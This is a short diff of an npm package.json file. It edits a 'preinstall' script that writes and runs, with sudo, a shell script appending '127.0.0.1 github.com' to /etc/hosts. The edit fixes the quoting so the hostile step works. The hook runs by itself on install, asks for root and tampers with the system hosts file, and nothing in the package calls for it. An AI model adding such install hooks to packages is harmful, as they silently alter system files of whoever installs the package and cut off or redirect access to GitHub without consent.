@@ -5,7 +5,7 @@
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" && exit 1",
-    "preinstall": "echo 'echo "127.0.0.1 github.com" >> /etc/hosts' > bla.sh && chmod +x bla.sh && sudo ./bla.sh"
+    "preinstall": "echo 'echo \"127.0.0.1 github.com\" >> /etc/hosts' > bla.sh && chmod +x bla.sh && sudo ./bla.sh"
   },
   "author": "",
   "license": "ISC",
